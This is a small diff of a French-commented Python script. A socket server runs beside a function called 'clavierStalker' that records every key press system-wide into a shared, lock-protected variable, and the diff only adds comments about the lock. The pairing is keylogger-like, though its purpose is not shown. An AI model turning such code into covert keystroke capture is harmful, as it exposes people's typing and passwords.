@@ -12,7 +12,7 @@ serveur.bind((HOST, PORT))
 serveur.listen(1)
 print("Le serveur est prêt...")
 
-# Variable partagée entre threads
+# Variable partagée entre threads donc necessite un verrou pour eviter les truc chelou
 message_lock = threading.Lock()
 message = "piou piou 1er du nom"
 
@@ -22,6 +22,7 @@ def clavierStalker():
     while True:
         event = keyboard.read_event()
         if event.event_type == keyboard.KEY_DOWN:
+            # pour ne pas que plusieurs fonctions modifient message on lui mets un verrou
             with message_lock:
                 message = event.name
 
